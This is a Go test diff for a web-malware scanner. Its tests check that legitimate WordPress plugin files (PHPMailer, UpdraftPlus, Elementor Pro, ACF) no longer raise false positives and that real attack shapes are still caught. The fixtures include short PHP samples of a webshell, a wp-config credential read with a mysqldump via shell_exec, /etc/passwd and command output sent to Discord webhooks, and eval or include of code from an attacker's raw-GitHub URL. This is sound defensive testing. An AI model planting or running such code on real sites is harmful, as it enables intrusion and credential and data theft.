@@ -760,3 +760,237 @@ echo '</urlset>';
 		t.Error("spam_sitemap_hijack regression: hardcoded spam-TLD <loc> entries inside <urlset> must keep firing")
 	}
 }
+
+// FP reconstructions for the 2026-04-28 cPanel package-restore event.
+//
+// A cPanel pkgacct restore extracted a backup containing legitimate WP plugins
+// (PHPMailer core, UpdraftPlus, Elementor Pro, Advanced Custom Fields). The
+// rules below fired on those files because the patterns were too broad: a
+// pair of common substrings cleared min_match=2 without the tightening regex
+// having to match. The negative cases reproduce the real FPs; the positive
+// cases keep actual malicious shapes detectable after the fix.
+
+func TestWebshellMarijuana_PHPMailerSafeModeAware(t *testing.T) {
+	scanner := loadRepoScanner(t)
+
+	// PHPMailer.php (WordPress core copy at wp-includes/PHPMailer): has the
+	// substring "passthru(" inside the method name "mailPassthru(" and the
+	// word "safe_mode" inside a docblock describing safe_mode-aware mailing.
+	// No Marijuana shell markers anywhere.
+	legit := []byte(`<?php
+/**
+ * PHPMailer - PHP email creation and transport class.
+ */
+class PHPMailer {
+    /**
+     * Call mail() in a safe_mode-aware fashion.
+     */
+    private function mailPassthru($to, $subject, $body, $header, $params) {
+        return mail($to, $subject, $body, $header, $params);
+    }
+}
+`)
+	matches := scanner.ScanContent(legit, ".php")
+	if hasRule(matches, "webshell_marijuana") {
+		t.Error("webshell_marijuana FP: matched PHPMailer.php (mailPassthru method + safe_mode docblock are not Marijuana Shell markers)")
+	}
+
+	// Real Marijuana Shell: contains the unique shell name in HTML/title.
+	malicious := []byte(`<?php
+// Marijuana Shell v1.0 by Turkish hackers
+echo "<title>MarijuanaShell</title>";
+@passthru($_REQUEST["cmd"]);
+@ini_set("safe_mode", false);
+`)
+	matches = scanner.ScanContent(malicious, ".php")
+	if !hasRule(matches, "webshell_marijuana") {
+		t.Error("webshell_marijuana regression: real Marijuana Shell skeleton was not detected")
+	}
+}
+
+func TestExfilWpDbDumper_UpdraftPlusBootstrapFile(t *testing.T) {
+	scanner := loadRepoScanner(t)
+
+	// UpdraftPlus updraftplus.php (plugin bootstrap file): mentions
+	// "mysqldump" as a binary search-path constant and "wp-config.php" in a
+	// header comment. No exec/system/shell_exec/passthru of mysqldump - the
+	// real backup loop lives in class-updraftplus.php and uses popen() with
+	// escapeshellarg-built arguments.
+	legit := []byte(`<?php
+// The following can go in your wp-config.php:
+// define('UPDRAFTPLUS_MYSQLDUMP_EXECUTABLE', '/usr/bin/mysqldump');
+if (!defined('UPDRAFTPLUS_MYSQLDUMP_EXECUTABLE')) {
+    define('UPDRAFTPLUS_MYSQLDUMP_EXECUTABLE', updraftplus_build_mysqldump_list());
+}
+function updraftplus_build_mysqldump_list() {
+    return "/usr/bin/mysqldump,/bin/mysqldump,/usr/local/bin/mysqldump";
+}
+`)
+	matches := scanner.ScanContent(legit, ".php")
+	if hasRule(matches, "exfil_wp_db_dumper") {
+		t.Error("exfil_wp_db_dumper FP: matched UpdraftPlus updraftplus.php (mysqldump as binary path + wp-config.php in header comment, no shell-exec invocation)")
+	}
+
+	// Real db-dumper: shell-exec of mysqldump from PHP, paired with reading
+	// wp-config.php for credentials.
+	malicious := []byte(`<?php
+$wp = file_get_contents('/home/victim/public_html/wp-config.php');
+preg_match("/DB_PASSWORD',\s*'([^']+)'/", $wp, $m);
+$pw = $m[1];
+shell_exec("mysqldump -u root -p$pw victim_db > /tmp/d.sql");
+`)
+	matches = scanner.ScanContent(malicious, ".php")
+	if !hasRule(matches, "exfil_wp_db_dumper") {
+		t.Error("exfil_wp_db_dumper regression: shell_exec of mysqldump after reading wp-config.php must keep firing")
+	}
+}
+
+func TestDropperDiscordWebhook_ElementorProFormAction(t *testing.T) {
+	scanner := loadRepoScanner(t)
+
+	// Elementor Pro pro-elements/modules/forms/actions/discord.php:
+	// legitimate form-action that posts user-configured form fields to a
+	// user-configured Discord webhook via wp_remote_post(). No file reads,
+	// no shell exec, no eval.
+	legit := []byte(`<?php
+namespace ElementorPro\Modules\Forms\Actions;
+class Discord extends Action_Base {
+    public function get_name() { return 'discord'; }
+    public function register_settings_section($widget) {
+        $widget->add_control('discord_webhook', [
+            'placeholder' => 'https://discordapp.com/api/webhooks/',
+        ]);
+    }
+    public function run($record, $ajax_handler) {
+        $settings = $record->get('form_settings');
+        if (false === strpos($settings['discord_webhook'], 'https://discordapp.com/api/webhooks/')) {
+            return;
+        }
+        $webhook_data = ['embeds' => $this->build_embeds($settings, $record)];
+        $response = wp_remote_post($settings['discord_webhook'], [
+            'body' => wp_json_encode($webhook_data),
+            'headers' => ['Content-Type' => 'application/json; charset=utf-8'],
+        ]);
+    }
+}
+`)
+	matches := scanner.ScanContent(legit, ".php")
+	if hasRule(matches, "dropper_discord_webhook") {
+		t.Error("dropper_discord_webhook FP: matched Elementor Pro discord.php (wp_remote_post of user-configured form data is not a dropper)")
+	}
+
+	// Real Discord exfil dropper: posts contents of /etc/passwd to a
+	// hardcoded webhook.
+	malicious := []byte(`<?php
+$d = file_get_contents('/etc/passwd');
+file_get_contents('https://discord.com/api/webhooks/123/abc?content=' . urlencode($d));
+`)
+	matches = scanner.ScanContent(malicious, ".php")
+	if !hasRule(matches, "dropper_discord_webhook") {
+		t.Error("dropper_discord_webhook regression: real /etc/passwd to Discord webhook exfil was not detected")
+	}
+
+	// Real C2: shell-exec on direct superglobal input, results posted to
+	// webhook. Inline-dropper shape, no intermediate variable.
+	maliciousC2 := []byte(`<?php
+$out = shell_exec($_POST['cmd']);
+$ch = curl_init('https://discordapp.com/api/webhooks/999/zzz');
+curl_setopt($ch, CURLOPT_POSTFIELDS, ['content' => $out]);
+curl_exec($ch);
+`)
+	matches = scanner.ScanContent(maliciousC2, ".php")
+	if !hasRule(matches, "dropper_discord_webhook") {
+		t.Error("dropper_discord_webhook regression: shell_exec C2 with Discord callback was not detected")
+	}
+}
+
+func TestPhpDropperRawGithub_ProElementsUpdaterConfig(t *testing.T) {
+	scanner := loadRepoScanner(t)
+
+	// Pro Elements (free fork of Elementor Pro) ships an in-plugin updater
+	// that references the upstream raw-GitHub URL as a config string. No
+	// fetch, no eval, no include of remote content.
+	legit := []byte(`<?php
+namespace ElementorPro;
+class Plugin {
+    public function init_updater() {
+        require_once __DIR__ . '/updater/updater.php';
+        $config = array(
+            'slug'               => 'pro-elements.php',
+            'api_url'            => 'https://api.github.com/repos/proelements/proelements',
+            'raw_url'            => 'https://raw.githubusercontent.com/proelements/proelements/master',
+            'github_url'         => 'https://github.com/proelements/proelements',
+            'sslverify'          => true,
+        );
+        new Updater($config);
+    }
+}
+`)
+	matches := scanner.ScanContent(legit, ".php")
+	if hasRule(matches, "php_dropper_raw_github") {
+		t.Error("php_dropper_raw_github FP: matched Pro Elements plugin.php (raw-GitHub URL in updater config string, no remote include or eval)")
+	}
+
+	// Real dropper: fetches PHP from raw GitHub and evals it.
+	malicious := []byte(`<?php
+$payload = file_get_contents('https://raw.githubusercontent.com/attacker/repo/main/x.php');
+@eval($payload);
+`)
+	matches = scanner.ScanContent(malicious, ".php")
+	if !hasRule(matches, "php_dropper_raw_github") {
+		t.Error("php_dropper_raw_github regression: file_get_contents of raw GitHub + eval was not detected")
+	}
+
+	maliciousInclude := []byte(`<?php
+include 'https://raw.githubusercontent.com/attacker/repo/main/payload.php';
+`)
+	matches = scanner.ScanContent(maliciousInclude, ".php")
+	if !hasRule(matches, "php_dropper_raw_github") {
+		t.Error("php_dropper_raw_github regression: include of raw-GitHub URL was not detected")
+	}
+}
+
+func TestExploitWpRestApi_ACFFieldDocblock(t *testing.T) {
+	scanner := loadRepoScanner(t)
+
+	// Advanced Custom Fields class-acf-field.php: docblock contains REST API
+	// example URLs (wp-json/wp/v2/posts/N, wp-json/wp/v2/users/N) as part of
+	// example return-shape documentation. No password-leak query, no user
+	// enumeration code path.
+	legit := []byte(`<?php
+class ACF_Field {
+    /**
+     * @return array Example response shape:
+     *   array(
+     *     '_links' => array(
+     *       'author' => array(
+     *         'href' => 'https://example.com/wp-json/wp/v2/users/2',
+     *       ),
+     *       'self' => array(
+     *         'href' => 'https://example.com/wp-json/wp/v2/posts/497',
+     *       ),
+     *     ),
+     *   )
+     */
+    public function get_links($post_id) {
+        return rest_get_server()->response_to_data($post_id, true);
+    }
+}
+`)
+	matches := scanner.ScanContent(legit, ".php")
+	if hasRule(matches, "exploit_wp_rest_api") {
+		t.Error("exploit_wp_rest_api FP: matched ACF class-acf-field.php (wp-json/wp/v2/users URL in docblock example, no password-leak path)")
+	}
+
+	// Real exploit: probes /wp/v2/users with password parameter to harvest
+	// hashes from the REST response.
+	malicious := []byte(`<?php
+$response = file_get_contents('https://victim.com/wp-json/wp/v2/users?per_page=100&password=1');
+$users = json_decode($response, true);
+foreach ($users as $u) { echo $u['slug'] . ':' . $u['password_hash'] . "\n"; }
+`)
+	matches = scanner.ScanContent(malicious, ".php")
+	if !hasRule(matches, "exploit_wp_rest_api") {
+		t.Error("exploit_wp_rest_api regression: wp-json/wp/v2/users password-leak probe was not detected")
+	}
+}
